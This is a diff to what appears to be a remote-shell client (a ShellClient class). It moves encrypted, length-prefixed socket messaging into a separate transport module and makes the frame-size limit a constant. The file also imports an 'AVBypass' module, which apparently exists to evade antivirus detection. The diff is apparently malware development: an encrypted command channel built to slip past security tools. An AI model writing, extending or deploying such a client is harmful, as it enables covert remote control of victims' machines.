@@ -15,6 +15,17 @@ _CLIENT_DIR = os.path.dirname(os.path.abspath(__file__))
 if _CLIENT_DIR not in sys.path:
     sys.path.insert(0, _CLIENT_DIR)
 
+if __package__:
+    from . import transport as _transport
+else:
+    import transport as _transport
+
+MAX_FRAME_SIZE = _transport.MAX_FRAME_SIZE
+_decrypt = _transport.decrypt
+_derive_key = _transport.derive_key
+encode_message = _transport.encode_message
+_encrypt = _transport.encrypt
+
 try:
     from av_bypass import AVBypass
 except ImportError:
@@ -836,16 +847,11 @@ class ShellClient:
         """Send data with length prefix (thread-safe)"""
         with self.send_lock:
             try:
-                if isinstance(data, str):
-                    data = data.encode('utf-8')
-
-                data = _encrypt(_derive_key(CLIENT_PASSWORD), data)
-
-                # Send length (4 bytes)
-                msg_len = len(data)
-                self.socket.sendall(struct.pack('!I', msg_len))
-                # Send data
-                self.socket.sendall(data)
+                length_packet, payload = encode_message(
+                    _encrypt(_derive_key(CLIENT_PASSWORD), data)
+                )
+                self.socket.sendall(length_packet)
+                self.socket.sendall(payload)
                 return True
 
             except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
@@ -871,11 +877,10 @@ class ShellClient:
 
                 msglen = struct.unpack('!I', raw_msglen)[0]
 
-                if msglen > 10 * 1024 * 1024:  # 10MB limit
+                if msglen > MAX_FRAME_SIZE:
                     print(f"[!] Message too large: {msglen} bytes")
                     return None
 
-                # Receive the actual message (encrypted payload)
                 payload = self._recv_exactly(msglen)
                 return _decrypt(_derive_key(CLIENT_PASSWORD), payload)
 
